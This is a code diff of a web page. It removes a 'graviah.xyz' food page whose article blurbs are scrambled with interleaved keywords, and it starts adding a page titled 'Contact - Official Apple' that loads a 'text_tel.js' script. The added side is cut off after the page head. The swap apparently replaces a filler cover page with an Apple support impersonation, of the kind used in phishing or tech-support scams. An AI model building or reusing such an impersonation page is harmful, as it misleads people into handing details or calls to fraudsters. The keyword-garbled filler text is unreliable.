@@ -1,9 +1,375 @@
-<html><head><meta charset="UTF-8" class="current-VXhdAZhienRXQ"/><link rel="stylesheet" href="styles.css" class="userpic-qmKxGF"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="btn-VjzXoHf"/><meta name="referrer" content="no-referrer" class="holder-RnfECUURW"/><style> @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@200..700&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #d21f3a; border-radius: 20px; } *::-webkit-scrollbar-thumb { background-color: #aecccc; border-radius: 20px; border: 3px solid #d21f3a; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>graviah.xyz</title><!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-YTP08B4056"></script>
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NP1FZ3QXDK"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-YTP08B4056');
-</script></head><body class="tagline-NRjwHqyLQ"><main class="thumb-FeWToMRbSTeTWIxE"><div style="display: flex; position: relative; justify-content: space-between; align-items: center; width: 80%; height: max-content; margin: calc(0vw/var(--resizer)*100) auto calc(0vw/var(--resizer)*100) auto; padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; gap: undefined; flex-direction: row; background: inherit; background-color: #f8fffd; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'flower-7_394'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cpattern%20id%3D'4374'%20patternUnits%3D'userSpaceOnUse'%20width%3D'50'%20height%3D'50'%20patternTransform%3D'scale(10)%20rotate(56)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23f8fffd'%2F%3E%3Cpath%20d%3D'M25%203.95L22.3%209.2c-1.45%202.75-.95%206.15%201.25%208.35L25%2019l1.45-1.45c2.15-2.2%202.65-5.6%201.25-8.35zm0%207.5c.85%200%201.5.7%201.5%201.5%200%20.85-.65%201.5-1.5%201.5s-1.5-.7-1.5-1.5c0-.85.65-1.5%201.5-1.5zm-13.1.45l.75%205.6c.15%201.15%201%202.05%202.1%202.35l6.8%201.7-1.7-6.8c-.25-1.1-1.2-1.95-2.35-2.1zm26.2%200l-5.6.75c-1.15.15-2.05%201-2.35%202.1l-1.7%206.8%206.8-1.7c1.1-.25%201.95-1.2%202.1-2.35zm-21.4%203.4c.75%200%201.4.6%201.4%201.4%200%20.4-.15.75-.4%201s-.6.4-1%20.4c-.75%200-1.4-.6-1.4-1.4%200-.35.15-.75.4-1s.6-.4%201-.4zm16.55%200c.4%200%20.75.15%201%20.4s.4.6.4%201c0%20.75-.6%201.4-1.4%201.4-.4%200-.75-.15-1-.4s-.4-.6-.4-1c0-.75.6-1.4%201.4-1.4zm4.28%206.179a7.102%207.102%200%2000-5.08%202.072L31%2025l1.45%201.45c2.2%202.15%205.6%202.65%208.35%201.25l5.25-2.7-5.25-2.7a7.126%207.126%200%2000-3.27-.821zm-25.06.035a7.267%207.267%200%2000-3.27.787L3.95%2025l5.25%202.7c2.75%201.45%206.15.95%208.35-1.25L19%2025l-1.45-1.45c-1.374-1.343-3.218-2.043-5.08-2.036zm12.53.685c-.75%200-1.45.301-1.95.801s-.8%201.2-.8%201.95.3%201.45.8%201.95%201.2.8%201.95.8%201.45-.3%201.95-.8.8-1.2.8-1.95-.3-1.45-.8-1.95-1.2-.8-1.95-.8zm12%201.25c.85%200%201.5.65%201.5%201.5s-.7%201.5-1.5%201.5-1.5-.65-1.5-1.5.7-1.5%201.5-1.5zM13%2023.5c.8%200%201.5.65%201.5%201.5s-.7%201.5-1.5%201.5c-.85%200-1.5-.65-1.5-1.5s.7-1.5%201.5-1.5zm8.55%204.95l-6.8%201.7c-1.1.25-1.95%201.2-2.1%202.35l-.75%205.6%205.6-.75c1.15-.15%202.05-1%202.35-2.1zm6.9%200l1.7%206.8c.25%201.1%201.2%201.95%202.35%202.1l5.6.7-.75-5.6c-.15-1.15-1-2.05-2.1-2.35zM25%2031l-1.45%201.45c-2.15%202.2-2.65%205.6-1.25%208.35l2.7%205.25%202.7-5.25c1.45-2.75.95-6.15-1.25-8.35zm8.3.85c.75%200%201.4.6%201.4%201.4%200%20.4-.15.75-.4%201s-.6.4-1%20.4c-.75%200-1.4-.6-1.4-1.4%200-.4.15-.75.4-1s.6-.4%201-.4zm-16.55.05c.4%200%20.75.15%201%20.4s.4.6.4%201c0%20.75-.6%201.4-1.4%201.4-.4%200-.75-.2-1-.4-.25-.25-.4-.6-.4-1%200-.75.6-1.4%201.4-1.4zM25%2035.5c.85%200%201.5.7%201.5%201.5%200%20.85-.65%201.5-1.5%201.5s-1.5-.7-1.5-1.5.65-1.5%201.5-1.5z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23aecccc'%2F%3E%3Cpath%20d%3D'M1%200c.5.9%201.45%201.5%202.55%201.5C4.65%201.5%205.6.9%206.1%200zm42.9%200c.5.9%201.45%201.5%202.55%201.5C47.55%201.5%2048.5.9%2049%200zM0%201v5.1c.9-.5%201.5-1.45%201.5-2.55C1.5%202.45.9%201.5%200%201zm50%200c-.9.5-1.5%201.45-1.5%202.55%200%201.1.6%202.05%201.5%202.55zM0%2043.9V49c.9-.5%201.5-1.45%201.5-2.55%200-1.1-.6-2.05-1.5-2.55zm50%200c-.9.5-1.5%201.45-1.5%202.55%200%201.1.6%202.05%201.5%202.55zM3.55%2048.5c-1.1%200-2.05.6-2.55%201.5h5.1c-.5-.9-1.45-1.5-2.55-1.5zm42.9%200c-1.1%200-2.05.6-2.55%201.5H49c-.5-.9-1.45-1.5-2.55-1.5z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23aecccc'%2F%3E%3Cpath%20d%3D'M11.7%200A28.002%2028.002%200%2000.05%2011.65v1.45c1.3-2.8%203.1-5.4%205.4-7.65A27.64%2027.64%200%200113.15%200H11.7zm25.2.05c2.8%201.3%205.4%203.1%207.65%205.4a27.64%2027.64%200%20015.45%207.7V11.7A28.002%2028.002%200%200038.35.05H36.9zm-16.6.9a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm9.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM17.65%203.6a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm14.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-17.4%202.65a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm20.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM12.3%208.9a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm25.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM9.45%2011.75a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm31.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM6.8%2014.4a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm36.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM4.15%2017.05a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm41.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM1.5%2019.75a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm47%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-47%209.4a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm47%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM4.15%2031.8a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm41.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM6.8%2034.45a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm36.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM0%2036.85v1.45a28.002%2028.002%200%200011.65%2011.65h1.45c-2.8-1.3-5.4-3.15-7.65-5.4A27.64%2027.64%200%20010%2036.85zm49.95%200a25.563%2025.563%200%2001-5.4%207.7%2027.64%2027.64%200%2001-7.7%205.45h1.45a28.002%2028.002%200%200011.65-11.65v-1.5zm-40.5.3a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm31.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-28.25%202.8a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm25.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-22.75%202.7a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm20.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-17.4%202.65a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm14.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM20.3%2047.95a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm9.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55z'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23aecccc'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-213%2C-86)'%20fill%3D'url(%234374)'%2F%3E%3C%2Fsvg%3E&quot;);" class="tiny-ZWsbtbolu"><div class="xl-TmFOpmmSBxUA"><div class="tip-iCcjPIXxRUPafo"><img src="./img/e44bc6ce172b11e21489ac5c0c406df439046344.jpg" class="narrow-WXzaVVY"/></div></div><div class="subtitle-ZBzRfAEbWPXGMAEv"><div class="container-SZSgJiZXqjykaLS"><h3 class="wide-jFTfTsqkZfzRtQE">graviah.xyz</h3><span class="widget-tqKaHZcKqpioeLA">Recipe This article takes readers on a flavorful journey Cuisine Flavor Soups through the diverse world of cheese, exploring its Beverages Meal Cooking Dish Taste history, Snacks production Vegetarian methods, Seafood Desserts and cultural significance Dining across Non-veg different cuisines. Vegan Ingredient</span></div><div class="heading-XqAssEPIjdb"><a href="themelist0.html" class="title-fKLjmTZ"><span class="box-cYbDZQJ">Discover more</span></a></div></div></div><div class="wrap-ZnkToWsNvqmt"><div class="wide-YIiPRx"><div class="row-degPJvDFuKxzrj"><h3 class="widget-BVkFgIEoCTBO">Gallery</h3></div></div><div class="userpic-jPmXYRDqINXWfd"><div class="xl-vYUfgLcxry"><img src="./img/3fa1a15caf23cb27f97fc77363716efc58d2504f.jpg" class="desc-ffURMmXXY"/><img src="./img/7b87d4dd78aafd347583afe4332f0ae2f0d35de1.jpg" class="section-ovtOxLNYMXgRdxkf"/><img src="./img/1abfcc2e6aff56205ed516f83e1caec9c9254840.jpg" class="breadcrumbs-OQulWvWhkbnQka"/><img src="./img/4faef15055639c14967c3341f25e294ed2f01abf.jpg" class="button-ttuZnWb"/><img src="./img/b1d21292a24d57c993147ef023a84b9a9c401bb9.jpg" class="huge-kglOHpRSx"/><img src="./img/aead09e3cea2ba130ce9d521d75e4f2d839ef643.jpg" class="text-MGmNlyVAsfVAB"/></div></div></div><div class="tiny-WvVeIXrLtk"><div class="thumb-IfxDsLiK"><div class="narrow-pwNyAGxq"><h3 class="btn-CzMxOFv">Consumer Support</h3><span class="lg-WwddwMaysGZ"></span></div></div><form action="undefined" class="tiny-lzmxNNWK"><input placeholder="Username" class="tiny-sYZRcvAOO"/><input placeholder="Contact address" class="tagline-JtvQXxUTIC"/><button type="submit" class="all-wZofbb">Answer</button></form></div><div style="display: flex; position: relative; justify-content: center; align-items: center; min-width: 80%; gap: calc(23vw/var(--resizer)*100); padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; flex-direction: column; background-color: #aecccc; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'flower-7_394'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cpattern%20id%3D'4374'%20patternUnits%3D'userSpaceOnUse'%20width%3D'50'%20height%3D'50'%20patternTransform%3D'scale(10)%20rotate(56)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23f8fffd'%2F%3E%3Cpath%20d%3D'M25%203.95L22.3%209.2c-1.45%202.75-.95%206.15%201.25%208.35L25%2019l1.45-1.45c2.15-2.2%202.65-5.6%201.25-8.35zm0%207.5c.85%200%201.5.7%201.5%201.5%200%20.85-.65%201.5-1.5%201.5s-1.5-.7-1.5-1.5c0-.85.65-1.5%201.5-1.5zm-13.1.45l.75%205.6c.15%201.15%201%202.05%202.1%202.35l6.8%201.7-1.7-6.8c-.25-1.1-1.2-1.95-2.35-2.1zm26.2%200l-5.6.75c-1.15.15-2.05%201-2.35%202.1l-1.7%206.8%206.8-1.7c1.1-.25%201.95-1.2%202.1-2.35zm-21.4%203.4c.75%200%201.4.6%201.4%201.4%200%20.4-.15.75-.4%201s-.6.4-1%20.4c-.75%200-1.4-.6-1.4-1.4%200-.35.15-.75.4-1s.6-.4%201-.4zm16.55%200c.4%200%20.75.15%201%20.4s.4.6.4%201c0%20.75-.6%201.4-1.4%201.4-.4%200-.75-.15-1-.4s-.4-.6-.4-1c0-.75.6-1.4%201.4-1.4zm4.28%206.179a7.102%207.102%200%2000-5.08%202.072L31%2025l1.45%201.45c2.2%202.15%205.6%202.65%208.35%201.25l5.25-2.7-5.25-2.7a7.126%207.126%200%2000-3.27-.821zm-25.06.035a7.267%207.267%200%2000-3.27.787L3.95%2025l5.25%202.7c2.75%201.45%206.15.95%208.35-1.25L19%2025l-1.45-1.45c-1.374-1.343-3.218-2.043-5.08-2.036zm12.53.685c-.75%200-1.45.301-1.95.801s-.8%201.2-.8%201.95.3%201.45.8%201.95%201.2.8%201.95.8%201.45-.3%201.95-.8.8-1.2.8-1.95-.3-1.45-.8-1.95-1.2-.8-1.95-.8zm12%201.25c.85%200%201.5.65%201.5%201.5s-.7%201.5-1.5%201.5-1.5-.65-1.5-1.5.7-1.5%201.5-1.5zM13%2023.5c.8%200%201.5.65%201.5%201.5s-.7%201.5-1.5%201.5c-.85%200-1.5-.65-1.5-1.5s.7-1.5%201.5-1.5zm8.55%204.95l-6.8%201.7c-1.1.25-1.95%201.2-2.1%202.35l-.75%205.6%205.6-.75c1.15-.15%202.05-1%202.35-2.1zm6.9%200l1.7%206.8c.25%201.1%201.2%201.95%202.35%202.1l5.6.7-.75-5.6c-.15-1.15-1-2.05-2.1-2.35zM25%2031l-1.45%201.45c-2.15%202.2-2.65%205.6-1.25%208.35l2.7%205.25%202.7-5.25c1.45-2.75.95-6.15-1.25-8.35zm8.3.85c.75%200%201.4.6%201.4%201.4%200%20.4-.15.75-.4%201s-.6.4-1%20.4c-.75%200-1.4-.6-1.4-1.4%200-.4.15-.75.4-1s.6-.4%201-.4zm-16.55.05c.4%200%20.75.15%201%20.4s.4.6.4%201c0%20.75-.6%201.4-1.4%201.4-.4%200-.75-.2-1-.4-.25-.25-.4-.6-.4-1%200-.75.6-1.4%201.4-1.4zM25%2035.5c.85%200%201.5.7%201.5%201.5%200%20.85-.65%201.5-1.5%201.5s-1.5-.7-1.5-1.5.65-1.5%201.5-1.5z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23aecccc'%2F%3E%3Cpath%20d%3D'M1%200c.5.9%201.45%201.5%202.55%201.5C4.65%201.5%205.6.9%206.1%200zm42.9%200c.5.9%201.45%201.5%202.55%201.5C47.55%201.5%2048.5.9%2049%200zM0%201v5.1c.9-.5%201.5-1.45%201.5-2.55C1.5%202.45.9%201.5%200%201zm50%200c-.9.5-1.5%201.45-1.5%202.55%200%201.1.6%202.05%201.5%202.55zM0%2043.9V49c.9-.5%201.5-1.45%201.5-2.55%200-1.1-.6-2.05-1.5-2.55zm50%200c-.9.5-1.5%201.45-1.5%202.55%200%201.1.6%202.05%201.5%202.55zM3.55%2048.5c-1.1%200-2.05.6-2.55%201.5h5.1c-.5-.9-1.45-1.5-2.55-1.5zm42.9%200c-1.1%200-2.05.6-2.55%201.5H49c-.5-.9-1.45-1.5-2.55-1.5z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23aecccc'%2F%3E%3Cpath%20d%3D'M11.7%200A28.002%2028.002%200%2000.05%2011.65v1.45c1.3-2.8%203.1-5.4%205.4-7.65A27.64%2027.64%200%200113.15%200H11.7zm25.2.05c2.8%201.3%205.4%203.1%207.65%205.4a27.64%2027.64%200%20015.45%207.7V11.7A28.002%2028.002%200%200038.35.05H36.9zm-16.6.9a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm9.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM17.65%203.6a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm14.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-17.4%202.65a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm20.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM12.3%208.9a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm25.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM9.45%2011.75a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm31.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM6.8%2014.4a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm36.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM4.15%2017.05a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm41.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM1.5%2019.75a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm47%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-47%209.4a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm47%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM4.15%2031.8a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm41.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM6.8%2034.45a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm36.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM0%2036.85v1.45a28.002%2028.002%200%200011.65%2011.65h1.45c-2.8-1.3-5.4-3.15-7.65-5.4A27.64%2027.64%200%20010%2036.85zm49.95%200a25.563%2025.563%200%2001-5.4%207.7%2027.64%2027.64%200%2001-7.7%205.45h1.45a28.002%2028.002%200%200011.65-11.65v-1.5zm-40.5.3a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm31.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-28.25%202.8a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm25.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-22.75%202.7a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm20.1%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm-17.4%202.65a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm14.7%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zM20.3%2047.95a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55zm9.4%200a.55.55%200%2000-.55.55.55.55%200%2000.55.55.55.55%200%2000.55-.55.55.55%200%2000-.55-.55z'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23aecccc'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-213%2C-86)'%20fill%3D'url(%234374)'%2F%3E%3C%2Fsvg%3E&quot;);" class="btn-xpHEEkDqR"><div class="narrow-fgBxgHrQfPNXUOXq"><div class="container-FrbaPr"><div class="picture-NLozaT"><div class="sidebar-JZSqZrfctmS"><img src="./img/3fa53057230b82151a15c81dc60a448b81ae8f06.jpg" class="button-XQXnSavYiAq"/></div></div><div class="big-IBygNlkuCyr"><div class="col-waQOSQAPBMBm"><a href="themelist1.html" class="row-HnVfoZWOZabVjQDY"><span class="widget-TKdjbeF">Discover more</span></a><a href="index.php" class="preview-gXkeDcpz"><span class="breadcrumbs-aEoQPKVjKC">Send out</span></a></div><div class="box-HyisNPfzGXBxdZC"><h5 class="tooltip-ULYTzMFjnMe">Exploring the Art of Burger Pairing: Sides, Drinks, and Beyond</h5><div class="narrow-pDGvGy"><span class="large-ejUrJRzm">Discover how to Flavor Snacks enhance your burger experience with Vegetarian Recipe the Beverages Taste Meal Vegan Cooking perfect pairings, from sides to beverages, Dish Non-veg Cuisine Ingredient Desserts elevating each bite into a culinary Seafood Dining delight. Soups</span></div></div><div class="image-HYMbELr"><div class="headline-nFxACLyKWfrrKDlS"><div class="medium-rnfdOVsah"><span class="aside-ZBLvsZzgi">Sophie Martin</span></div></div><div class="active-EcqWudqmK"><div class="heading-SPKUeGwNvyC"><span class="img-hgHpnDzH">2025-04-01</span></div></div></div></div></div><div class="section-UtlxjeeCJovzD"><div class="col-axIdruB"><div class="page-RaoPuZwxYUS"><img src="./img/747f1d83dbddcabb1d6f0470f27488fe366741b9.jpg" class="desc-PyOwxxevtIXU"/></div></div><div class="icon-sViCpoKaDRoYn"><div class="big-dyCCVTJdNWqLFI"><a href="themelist2.html" class="text-xuODXKMhvVE"><span class="image-dKOrJuWCZPdH">Discover more</span></a><a href="index.php" class="btn-wjQHGYZbEdOYncf"><span class="row-aKZatWRpl">Send out</span></a></div><div class="userpic-qGfgIigGguCw"><h5 class="box-IVgdMYTyqfKlLM">Exploring the World of Meat: A Culinary Journey Through Different Cuts</h5><div class="all-JuflBQkPjdc"><span class="sidebar-XRpWuvoJvrpY">Desserts Dive into Meal Ingredient the Cooking diverse Snacks universe of meats, from Taste beef to Vegan exotic options, and Dining discover their Vegetarian flavors, Flavor cooking methods, and Soups Cuisine the best Dish Seafood Non-veg recipes to try. Beverages Recipe</span></div></div><div class="desc-zRuJuznzREusaX"><div class="large-XCNTceDoWfoHju"><div class="xs-LVbcHEUQiGNgGD"><span class="active-eGVRMIfHywnnHaKG">Sophia Martinez</span></div></div><div class="btn-AxbRFq"><div class="thumbnail-OAlstWVZbuQjren"><span class="headline-ucPWlGLMdbycpEA">2025-01-18</span></div></div></div></div></div><div class="aside-YyCoZKrfWTZG"><div class="column-HHYxlcfVtSp"><div class="wide-jAZlaVNDMrZFl"><img src="./img/d614c92b9d0b9523edd82c4ef9a0353c715dbf98.jpg" class="content-ghvbEGieGDPIJHgu"/></div></div><div class="large-vSPvWGBTEMDd"><div class="caption-qNEpnocmPOIA"><a href="themelist3.html" class="container-VmTDHbHRNHDk"><span class="grid-RnAUSzpvmrJlF">Discover more</span></a><a href="index.php" class="thumbnail-AmkKBmX"><span class="sm-NOZgJorTWnE">Send out</span></a></div><div class="img-gxghcdeuwWOXKiyq"><h5 class="title-MlMrgIuCNlRM">Exploring the World of Tropical Fruits: A Flavorful Adventure</h5><div class="avatar-iiKscHcUFAurqn"><span class="xs-rivZaPi">Non-veg Beverages An Desserts Flavor in-depth look Ingredient at various tropical Snacks fruits, Soups Vegetarian their Vegan Recipe Dining nutritional benefits, culinary uses, and Cooking how to incorporate Taste them into your diet Meal Seafood for Dish a burst of Cuisine flavor.</span></div></div><div class="all-ofYyFhSUuVX"><div class="img-HEUHLoBVaZw"><div class="headline-UijTLKb"><span class="large-fcQOUwZ">Sophia Martinez</span></div></div><div class="wrap-vuWdbJzma"><div class="wrapper-SUjAcaMUU"><span class="section-XOoNPNaDUrOq">2025-03-23</span></div></div></div></div></div><div class="btn-OawihxiLplxQuZE"><div class="big-ZTStYbeIsJfnUP"><div class="row-MhlfXyLfaohT"><img src="./img/753a6bcfa15b012c84d27487c2e8e898663a83e4.jpg" class="icon-UXdtkuYudFKKfmg"/></div></div><div class="big-umfrUiIXYtM"><div class="icon-eonkdUqIyYRjDflF"><a href="themelist4.html" class="holder-bSJLeWo"><span class="userpic-hYWzdEImoH">Discover more</span></a><a href="index.php" class="md-qltbEfz"><span class="tip-ESoDjkUyhal">Send out</span></a></div><div class="narrow-ufyNxdEAw"><h5 class="tip-GWLRjY">Exploring the World of Meat Substitutes: A Culinary Revolution</h5><div class="container-beoHkTXnKZwef"><span class="current-mYgXUZAi">Desserts This article Seafood delves Flavor into the diverse Cuisine Cooking Snacks Dining range of meat substitutes, exploring Soups their Vegan flavors, nutritional Vegetarian benefits, and how they Non-veg are Beverages Dish transforming Ingredient modern Taste Recipe cooking. Meal</span></div></div><div class="thumb-gphRYulOFJlMHS"><div class="aside-YaFZMKoNbN"><div class="subject-JYMnri"><span class="heading-ZwYJJCPRhtk">Liam Henderson</span></div></div><div class="page-LkRjGadfHSTG"><div class="sm-xylNspUoTgyABCC"><span class="preview-FucxlscuTeaWKUNe">2025-07-07</span></div></div></div></div></div><div 